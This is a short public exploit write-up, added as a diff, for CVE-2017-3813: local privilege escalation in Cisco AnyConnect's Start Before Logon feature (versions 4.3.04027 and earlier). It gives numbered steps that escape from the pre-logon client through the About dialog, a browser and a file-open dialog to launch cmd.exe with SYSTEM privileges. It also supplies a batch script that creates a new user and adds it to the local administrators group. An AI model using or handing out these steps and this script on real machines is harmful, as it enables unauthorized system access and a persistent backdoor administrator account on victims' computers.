@@ -1,0 +1,27 @@
+﻿# Exploit Title: Cisco AnyConnect Start Before Logon (SBL) local privilege escalation. CVE-2017-3813
+# Date: 02/27/2017
+# Exploit Author: @Pcchillin
+# Software Link: http://www.cisco.com/c/en/us/support/security/anyconnect-secure-mobility-client/tsd-products-support-series-home.html
+# Version: 4.3.04027 and earlier
+# Tested on: Windows 10
+# CVE : CVE-2017-3813
+# Vendor ID : cisco-sa-20170208-anyconnect
+
+
+#Run CMD.EXE with system privileges
+1. Start Cisco anyconnect from logon screen.
+2. Once the Cisco app comes up (where you can select a profile and hit connect) hold CTRL and hit B.
+3. When the Cisco about window appears then select the URL at the bottom. This will open Internet Explorer or you can select Chrome if installed.
+4. Once Internet Explorer is started press CTRL-O, then select browse. Chrome press CTRL-O and explorer will open.
+5. You can then navigate to the C:\Windows\System32\ folder and find CMD.exe then right click and select RunAsAdministrator.
+
+
+#Run scripts from USB flash drive
+Follow steps from above and navigate to the flash drive right click and select run. You can also edit the document.
+Example bat script:
+Net user #USERNAME #PASSWORD /add
+Net localgroup administrators #USERNAME /add
+
+
+#Vendor link to advisory: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170208-anyconnect
+#Twitter handle @pcchillin
